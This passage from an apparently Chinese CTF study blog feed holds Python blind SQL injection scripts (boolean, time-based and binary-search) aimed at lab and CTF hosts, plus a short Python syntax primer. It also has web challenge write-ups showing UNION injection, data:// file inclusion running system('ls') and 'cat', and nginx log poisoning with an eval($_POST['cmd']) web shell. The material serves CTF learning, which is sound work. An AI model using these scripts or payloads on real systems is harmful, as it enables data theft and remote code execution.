class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>,<span class="hljs-number">130</span>):<br>            payload = <span class="hljs-string">&quot;admin&#x27;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d#&quot;</span>%(i,j)<br>            data = &#123;<span class="hljs-string">&quot;uname&quot;</span>:payload,<span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;submit&quot;</span>:<span class="hljs-string">&quot;submit&quot;</span>&#125;<br>            html = requests.post(url=url, data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag.jpg&quot;</span> <span class="hljs-keyword">in</span> html.text:<br>                name += <span class="hljs-built_in">chr</span>(j)<br>                <span class="hljs-built_in">print</span>(name)<br>get_name_table()<br></code></pre></td></tr></table></figure><h3 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs-master/Less-13/&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_len_database</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">25</span>):<br>        payload = <span class="hljs-string">&quot;admin&#x27;) and sleep(if(length((select database()))=%d,3,0))#&quot;</span>%(i)<br>        data = &#123;<span class="hljs-string">&quot;uname&quot;</span>:payload, <span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;submit&quot;</span>:<span class="hljs-string">&quot;submit&quot;</span>&#125;<br>        start = time.time()<br>        html = requests.post(url=url, data=data)<br>        end = time.time() <span class="hljs-comment"># 这里好像只能同time.time()</span><br>        ttt = end-start<br>        <span class="hljs-keyword">if</span> ttt &gt;=<span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-keyword">return</span> i<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_name_database</span>():<br>    number = get_len_database()<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,number+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>,<span class="hljs-number">130</span>):<br>            payload = <span class="hljs-string">&quot;admin&#x27;) and sleep(if(ascii(substr((select database()),%d,1))=%d,3,0))#&quot;</span>%(i,j)<br>            data = &#123;<span class="hljs-string">&quot;uname&quot;</span>:payload,<span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;submit&quot;</span>:<span class="hljs-string">&quot;submit&quot;</span>&#125;<br>            start = time.time()<br>            <span class="hljs-comment"># print(data)</span><br>            html = requests.post(url=url, data=data) <br>            end = time.time()<br>            ttt = end - start<br>            <span class="hljs-comment"># print(ttt)</span><br>            <span class="hljs-keyword">if</span> ttt &gt;= <span class="hljs-number">2</span>:<br>                name += <span class="hljs-built_in">chr</span>(j)<br>                <span class="hljs-built_in">print</span>(name)<br>get_name_database()<br><br><span class="hljs-comment"># 一定要注意payload不要写错不然查错要查特别久</span><br></code></pre></td></tr></table></figure><h1 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h1><h2 id="通过post传参的脚本"><a href="#通过post传参的脚本" class="headerlink" title="通过post传参的脚本"></a>通过post传参的脚本</h2><p>用的时候修改post参数和个数</p><h3 id="1-1-基于异或盲注，布尔盲注等："><a href="#1-1-基于异或盲注，布尔盲注等：" class="headerlink" title="1.1 基于异或盲注，布尔盲注等："></a>1.1 基于异或盲注，布尔盲注等：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://736aa374-b497-441f-9b6a-a1c91f9b182b.node4.buuoj.cn:81/login.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>    high = <span class="hljs-number">127</span><br>    low = <span class="hljs-number">32</span><br>    mid = (low + high) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> high &gt; low:<br>        <span class="hljs-comment">#payload = f&quot;1&#x27; or ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;#&quot;    #查库</span><br>        <span class="hljs-comment">#payload = f&quot;1&#x27; or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;note&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;#&quot;   #查表</span><br>        <span class="hljs-comment">#payload = f&quot;1&#x27; or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;fl4g&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;#&quot;   #查列</span><br>        payload = <span class="hljs-string">f&quot;1&#x27; or ascii(substr((seleCt(flag)from(fl4g)),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>#&quot;</span>   <span class="hljs-comment">#查数据</span><br>        data = &#123;<br>            <span class="hljs-string">&quot;name&quot;</span>:payload,<br>            <span class="hljs-string">&quot;pass&quot;</span>:<span class="hljs-string">&#x27;qwer&#x27;</span><br>        &#125;<br>        response = requests.post(url, data = data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;u6216&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br>        mid = (low + high) // <span class="hljs-number">2</span>       <br>    <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span> :<br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(low))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="1-2-基于时间盲注："><a href="#1-2-基于时间盲注：" class="headerlink" title="1.2 基于时间盲注："></a>1.2 基于时间盲注：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://736aa374-b497-441f-9b6a-a1c91f9b182b.node4.buuoj.cn:81/login.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    high = <span class="hljs-number">127</span><br>    low = <span class="hljs-number">32</span><br>    mid = (low + high) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> high &gt; low:<br>        <span class="hljs-comment">#payload = f&quot;1&#x27; or if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),1)#&quot;       #查库名</span><br>        <span class="hljs-comment">#payload = f&quot;1&#x27;or if(ascii(substr((seleCt(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;note&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),1)#&quot;        #查表名</span><br>        <span class="hljs-comment">#payload = f&quot;1&#x27;or if(ascii(substr((seleCt(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;users&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),1)#&quot;        #查列名</span><br>        payload = <span class="hljs-string">f&quot;1&#x27;or if(ascii(substr((seleCt(flag)from(fl4g)),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,sleep(2),1)#&quot;</span>       <span class="hljs-comment">#查数据</span><br>        data = &#123;<br>            <span class="hljs-string">&quot;name&quot;</span>:payload,<br>            <span class="hljs-string">&quot;pass&quot;</span>:<span class="hljs-string">&#x27;qwer&#x27;</span><br>        &#125;        <br>        last = <span class="hljs-built_in">int</span>(time.time())<br>        response = requests.post(url, data = data)<br>        now = <span class="hljs-built_in">int</span>(time.time())<br>        <span class="hljs-keyword">if</span> now - last &gt; <span class="hljs-number">1</span> :    <br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span> :<br>            high = mid<br>        mid = (low + high) // <span class="hljs-number">2</span> <br>    <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span> :<br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(low))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="2-通过get传参的脚本"><a href="#2-通过get传参的脚本" class="headerlink" title="2.通过get传参的脚本"></a>2.通过get传参的脚本</h2><p>修改url 和 文本</p><p>2.通过get传参的脚本<br>修改url 和 文本</p><h3 id="2-1-基于异或盲注，布尔盲注等："><a href="#2-1-基于异或盲注，布尔盲注等：" class="headerlink" title="2.1 基于异或盲注，布尔盲注等："></a>2.1 基于异或盲注，布尔盲注等：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://d98fb290-369c-4ad8-8cd5-883846041dad.node4.buuoj.cn/search.php?id=&quot;</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    <span class="hljs-built_in">min</span> = <span class="hljs-number">32</span><br>    <span class="hljs-built_in">max</span> = <span class="hljs-number">128</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span>&lt;<span class="hljs-built_in">max</span>:<br>        mid = (<span class="hljs-built_in">min</span> + <span class="hljs-built_in">max</span>) // <span class="hljs-number">2</span><br>        payload=<span class="hljs-string">f&quot;1^(ascii(substr(database(),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>)#&quot;</span>       <span class="hljs-comment">#查库名</span><br>        <span class="hljs-comment">#payload=f&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;)#&quot;        #查表名</span><br>        <span class="hljs-comment">#payload=f&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;F1naI1y&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;)#&quot;      #查列名</span><br>        <span class="hljs-comment">#payload=f&quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;i&#125;,1))&gt;&#123;mid&#125;)#&quot;       #查数据</span><br>        response=requests.get(url=url+payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ERROR&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">max</span>=mid<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">min</span> != <span class="hljs-number">32</span> :<br>        name += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">min</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(name)<br></code></pre></td></tr></table></figure><h3 id="2-2-基于时间盲注："><a href="#2-2-基于时间盲注：" class="headerlink" title="2.2 基于时间盲注："></a>2.2 基于时间盲注：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time <br><br>url = <span class="hljs-string">&quot;http://d98fb290-369c-4ad8-8cd5-883846041dad.node4.buuoj.cn/search.php?id=&quot;</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    <span class="hljs-built_in">min</span> = <span class="hljs-number">32</span><br>    <span class="hljs-built_in">max</span> = <span class="hljs-number">128</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span>&lt;<span class="hljs-built_in">max</span>:<br>        mid = (<span class="hljs-built_in">min</span> + <span class="hljs-built_in">max</span>) // <span class="hljs-number">2</span><br>        payload=<span class="hljs-string">f&quot; &quot;</span>       <span class="hljs-comment">#查库名</span><br>        <span class="hljs-comment">#payload=f&quot; &quot;        #查表名</span><br>        <span class="hljs-comment">#payload=f&quot; &quot;      #查列名</span><br>        <span class="hljs-comment">#payload=f&quot; &quot;       #查数据</span><br>        last = <span class="hljs-built_in">int</span>(time.time())<br>        response=requests.get(url=url+payload)<br>        now = <span class="hljs-built_in">int</span>(time.time())<br>        <span class="hljs-keyword">if</span> now - last &gt; <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">max</span>=mid<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">min</span> != <span class="hljs-number">32</span> :<br>        name += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">min</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(name)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/05/10/python/"/>
    <url>/2023/05/10/python/</url>
    
    <content type="html"><![CDATA[<h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h4 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h4><ul><li>第一个字符必须是字母表中字母或下划线 <strong>_</strong> 。</li><li>标识符的其他的部分由字母、数字和下划线组成。</li><li>标识符对大小写敏感。</li></ul><p>在 Python 3 中，可以用中文作为变量名，非 ASCII 标识符也是允许的了。</p><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>Python中单行注释以 <strong>#</strong> 开头<br>多行注释可以用多个 <strong>#</strong> 号，还有 <strong>‘’’</strong> 和 <strong>“””</strong></p><h4 id="行与缩进"><a href="#行与缩进" class="headerlink" title="行与缩进"></a>行与缩进</h4><p>python最具特色的就是使用缩进来表示代码块，不需要使用大括号 <strong>{}</strong> 。</p><p>缩进的空格数是可变的，但是同一个代码块的语句必须包含相同的缩进空格数。</p><h4 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h4><p>Python 通常是一行写完一条语句，但如果语句很长，我们可以使用反斜杠 \来实现多行语句</p><h4 id="数字-Number-类型"><a href="#数字-Number-类型" class="headerlink" title="数字(Number)类型"></a>数字(Number)类型</h4><p>python中数字有四种类型：整数、布尔型、浮点数和复数</p><h4 id="字符串-String"><a href="#字符串-String" class="headerlink" title="字符串(String)"></a>字符串(String)</h4><ul><li>Python 中单引号 <strong>‘</strong> 和双引号 <strong>“</strong> 使用完全相同。</li><li>使用三引号(<strong>‘’’</strong> 或 <strong>“””</strong>)可以指定一个多行字符串。</li><li>转义符 \。</li><li>反斜杠可以用来转义，使用 <strong>r</strong> 可以让反斜杠不发生转义。 如 <strong>r”this is a line with \n”</strong> 则 <strong>\n</strong> 会显示，并不是换行。</li><li>按字面意义级联字符串，如 <strong>“this “ “is “ “string”</strong> 会被自动转换为 <strong>this is string</strong>。</li><li>字符串可以用 <strong>+</strong> 运算符连接在一起，用 ***** 运算符重复。</li><li>Python 中的字符串有两种索引方式，从左往右以 <strong>0</strong> 开始，从右往左以 <strong>-1</strong> 开始。</li><li>Python 中的字符串不能改变。</li><li>Python 没有单独的字符类型，一个字符就是长度为 1 的字符串。</li><li>字符串的截取的语法格式如下：<strong>变量[头下标:尾下标:步长]</strong></li></ul><h4 id="同一行显示多条语句"><a href="#同一行显示多条语句" class="headerlink" title="同一行显示多条语句"></a>同一行显示多条语句</h4><p>Python 可以在同一行中使用多条语句，语句之间使用分号 <strong>;</strong> 分割</p><h4 id="多个语句构成代码组"><a href="#多个语句构成代码组" class="headerlink" title="多个语句构成代码组"></a>多个语句构成代码组</h4><p>缩进相同的一组语句构成一个代码块，我们称之代码组。</p><p>像if、while、def和class这样的复合语句，首行以关键字开始，以冒号( : )结束，该行之后的一行或多行代码构成代码组。</p><p>我们将首行及后面的代码组称为一个子句(clause)。</p><h4 id="print-输出"><a href="#print-输出" class="headerlink" title="print 输出"></a>print 输出</h4><p><strong>print</strong> 默认输出是换行的，如果要实现不换行需要在变量末尾加上 <strong>end&#x3D;””</strong></p><h2 id="List（列表）"><a href="#List（列表）" class="headerlink" title="List（列表）"></a>List（列表）</h2><p>List（列表） 是 Python 中使用最频繁的数据类型。</p><p>列表可以完成大多数集合类的数据结构实现。列表中元素的类型可以不相同，它支持数字，字符串甚至可以包含列表（所谓嵌套）。</p><p>列表是写在方括号 <strong>[]</strong> 之间、用逗号分隔开的元素列表。</p><p>和字符串一样，列表同样可以被索引和截取，列表被截取后返回一个包含所需元素的新列表。</p><p><strong>注意：</strong></p><ul><li>1、List写在方括号之间，元素用逗号隔开。</li><li>2、和字符串一样，list可以被索引和切片。</li><li>3、List可以使用+操作符进行拼接。</li><li>4、List中的元素是可以改变的。</li></ul><h2 id="Tuple（元组）"><a href="#Tuple（元组）" class="headerlink" title="Tuple（元组）"></a>Tuple（元组）</h2><p>元组（tuple）与列表类似，不同之处在于元组的元素不能修改。元组写在小括号 <strong>()</strong> 里，元素之间用逗号隔开。</p><p>元组中的元素类型也可以不相同</p><p>虽然tuple的元素不可改变，但它可以包含可变的对象，比如list列表。</p><p><strong>注意：</strong></p><ul><li>1、与字符串一样，元组的元素不能修改。</li><li>2、元组也可以被索引和切片，方法一样。</li><li>3、注意构造包含 0 或 1 个元素的元组的特殊语法规则。</li><li>4、元组也可以使用+操作符进行拼接。</li></ul><h2 id="Set（集合）"><a href="#Set（集合）" class="headerlink" title="Set（集合）"></a>Set（集合）</h2><p>集合（set）是由一个或数个形态各异的大小整体组成的，构成集合的事物或对象称作元素或是成员。</p><p>基本功能是进行成员关系测试和删除重复元素。</p><p>可以使用大括号 <strong>{ }</strong> 或者 <strong>set()</strong> 函数创建集合，注意：创建一个空集合必须用 <strong>set()</strong> 而不是 **{ }**，因为 <strong>{ }</strong> 是用来创建一个空字典。</p><h2 id="Dictionary（字典）"><a href="#Dictionary（字典）" class="headerlink" title="Dictionary（字典）"></a>Dictionary（字典）</h2><p>字典（dictionary）是Python中另一个非常有用的内置数据类型。</p><p>列表是有序的对象集合，字典是无序的对象集合。两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。</p><p>字典是一种映射类型，字典用 <strong>{ }</strong> 标识，它是一个无序的 <strong>键(key) : 值(value)</strong> 的集合。</p><p>键(key)必须使用不可变类型。</p><p>在同一个字典中，键(key)必须是唯一的。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>web</title>
    <link href="/2023/05/07/%E5%88%B7%E9%A2%98/web/"/>
    <url>/2023/05/07/%E5%88%B7%E9%A2%98/web/</url>
    
    <content type="html"><![CDATA[<h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>ctrl+u 查看源码找到base64编码的flag</p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>尝试使用万能密码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure><p>发现登录成功<br>联合查询找到回显位置</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p>接着爆库</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p>爆表</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()#<br></code></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> fron information_schema.columns where table_name=&#x27;flag&#x27;#<br></code></pre></td></tr></table></figure><p>爆值</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,flag,<span class="hljs-number">3</span> from flag#<br></code></pre></td></tr></table></figure><p>得到flag</p><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>页面中显示了部分源码，明显是引导我们利用文件包含漏洞进行操作，源码中的include()函数通过GET请求接受一个url参数，那接下来我们就给它传递一个url参数</p><p>用伪协议查看有哪些文件</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://4ea64b5b-e0ed-4b72-b6b1-befac3ad6464.challenge.ctf.show/?url=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>发现ctf_go_go_go文件</p><p>查看内容</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://4ea64b5b-e0ed-4b72-b6b1-befac3ad6464.challenge.ctf.show/?url=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat ctf_go_go_go&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>得到flag</p><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>进入题目，看到只有一句文件包含的提示。<br>这题使用input协议data协议都不可行，应该是被禁用了，所以从数据包入手</p><p>看到使用的是nginx服务器，那我们想到可不可以通过日志文件进行写码得到flag呢，所以我们访问日志看看</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?url=<span class="hljs-regexp">/var/</span>lg<span class="hljs-regexp">/nginx/</span>access.log<br></code></pre></td></tr></table></figure><blockquote><p>查看日志发现，每访问一次数据包中的User-Agent头会被写进日志中，那就尝试在UA头中写码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>在UA头后插入一句话木马后日志文件里并未显示说明木马已经被解析了，然后使用蚁剑连接。</p></blockquote><p>在根目录中找到flag </p><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>        <span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ 